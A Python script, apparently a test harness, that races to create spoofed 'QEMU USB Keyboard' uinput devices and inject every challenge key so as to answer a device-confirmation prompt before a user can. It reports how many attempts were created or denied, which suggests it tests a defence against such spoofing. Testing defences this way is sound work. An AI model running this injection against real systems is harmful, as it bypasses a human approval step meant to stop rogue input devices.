#!/usr/bin/env python3
"""Race attack: for DURATION seconds keep creating uinput keyboards and pressing every
possible challenge key on each, hoping to land inside the prompt's set-up window.

usage: race.py [--duration S]
Prints a summary "race created=N denied=M".
"""
import argparse, fcntl, os, struct, time

UI_SET_EVBIT, UI_SET_KEYBIT = 0x40045564, 0x40045565
UI_DEV_SETUP, UI_DEV_CREATE, UI_DEV_DESTROY = 0x405C5503, 0x5501, 0x5502
CHALLENGE = list(range(59, 69)) + [87, 88] + list(range(2, 12))

def event(etype, code, value):
    return struct.pack("<qqHHi", 0, 0, etype, code, value)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--duration", type=float, default=6)
    a = ap.parse_args()
    end = time.time() + a.duration
    created = denied = 0
    while time.time() < end:
        fd = os.open("/dev/uinput", os.O_WRONLY)
        try:
            fcntl.ioctl(fd, UI_SET_EVBIT, 1)
            for code in range(1, 128):
                fcntl.ioctl(fd, UI_SET_KEYBIT, code)
            fcntl.ioctl(fd, UI_DEV_SETUP, struct.pack("<HHHH80sI", 3, 0x627, 1, 1, b"QEMU QEMU USB Keyboard", 0))
            fcntl.ioctl(fd, UI_DEV_CREATE)
            created += 1
            for _ in range(3):
                for code in CHALLENGE:
                    os.write(fd, event(1, code, 1) + event(0, 0, 0) + event(1, code, 0) + event(0, 0, 0))
                time.sleep(0.01)
            fcntl.ioctl(fd, UI_DEV_DESTROY)
        except OSError:
            denied += 1
            time.sleep(0.005)
        finally:
            os.close(fd)
    print(f"race created={created} denied={denied}", flush=True)

if __name__ == "__main__":
    main()
